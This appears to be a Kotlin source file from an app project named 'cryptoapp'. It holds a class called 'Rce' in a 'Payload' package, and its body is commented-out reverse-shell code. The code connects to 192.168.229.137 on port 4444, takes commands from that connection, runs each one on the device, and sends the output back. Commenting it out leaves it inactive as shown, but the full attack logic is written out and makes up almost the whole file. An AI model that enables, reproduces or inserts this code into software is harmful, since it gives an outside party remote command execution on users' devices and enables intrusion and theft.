package com.example.cryptoapp.Payload
//
//import java.net.Socket
//import java.io.*
//import java.util.*
//
class Rce  {
//    fun main(args: Array<String>) {
//        val host = "192.168.229.137"
//        val port = 4444
//
//        val socket = Socket(host, port)
//        val inputStream = socket.getInputStream()
//        val outputStream = socket.getOutputStream()
//        val scanner = Scanner(inputStream)
//        val printWriter = PrintWriter(outputStream, true)
//
//        val osName = System.getProperty("os.name")
//        if (osName.toLowerCase().contains("windows")) {
//            printWriter.println("cmd.exe")
//        } else {
//            printWriter.println("/bin/sh")
//        }
//
//        val bufferedReader = BufferedReader(InputStreamReader(inputStream))
//        while (true) {
//            val line = scanner.nextLine()
//            if (line.toLowerCase() == "exit") {
//                break
//            }
//            val process = Runtime.getRuntime().exec(line)
//            val reader = BufferedReader(InputStreamReader(process.inputStream))
//            var output = reader.readLine()
//            while (output != null) {
//                printWriter.println(output)
//                output = reader.readLine()
//            }
//            reader.close()
//        }
//
//        bufferedReader.close()
//        scanner.close()
//        socket.close()
//    }
//
}